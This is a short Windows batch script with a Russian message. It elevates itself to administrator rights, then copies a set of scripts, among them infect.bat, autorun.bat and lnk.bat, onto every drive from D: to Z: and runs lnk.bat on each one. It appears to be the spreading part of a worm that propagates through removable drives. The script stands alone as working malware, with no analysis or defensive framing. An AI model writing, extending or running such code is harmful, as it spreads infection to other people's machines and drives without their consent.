net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Запуск от имени администратора...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
set files=launch.bat infect.bat autorun.bat lnk.bat move_globalization.bat

for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        for %%f in (%files%) do (
            copy /Y "C:\%%f" "%%d:\%%f" >nul
        )
        call "%%d:\lnk.bat"
    )
)
exit